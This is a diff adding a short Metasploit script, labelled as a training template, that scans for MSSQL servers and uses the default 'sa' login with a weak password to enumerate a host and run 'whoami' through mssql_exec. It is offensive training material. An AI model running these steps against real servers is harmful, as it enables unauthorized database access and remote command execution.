@@ -1,0 +1,19 @@
+# MSSQL Enumeration Template
+# For Training Use – Non-functional Template
+
+use auxiliary/scanner/mssql/mssql_ping
+set RHOSTS <TARGET_RANGE>
+run
+
+use auxiliary/admin/mssql/mssql_enum
+set RHOSTS <TARGET_IP>
+set USERNAME sa
+set PASSWORD password123
+run
+
+use auxiliary/admin/mssql/mssql_exec
+set RHOSTS <TARGET_IP>
+set USERNAME sa
+set PASSWORD password123
+set CMD whoami
+run
